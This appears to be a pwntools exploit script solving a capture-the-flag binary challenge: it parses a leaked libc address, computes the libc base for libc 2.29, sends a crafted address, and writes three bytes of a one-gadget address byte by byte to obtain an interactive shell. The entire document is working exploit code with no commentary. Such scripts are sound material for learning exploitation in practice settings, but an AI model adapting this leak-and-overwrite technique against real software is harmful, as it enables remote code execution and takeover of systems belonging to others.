from pwn import*
from LD import*
p = process('./main')
libc = ELF('./libc-2.29.so',checksec=False)
context.log_level ='DEBUG'
p.recvuntil('near: ')
libc_base = int(p.recv(14),16) - libc.sym['puts'] - 0x3000
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('shoot!shoot!\n')
fake = libc_base + 0x217F70 
p.sendline(str(fake))
rce = libc_base + 0xC84DD + 0x3000
off = [rce&0xFF,(rce>>8)&0xFF,(rce>>16)&0xFF]
log.info('RCE:\t' + hex(rce))
for i in range(3):
	p.send(p8(off[i]))
	p.sendline()
p.interactive()
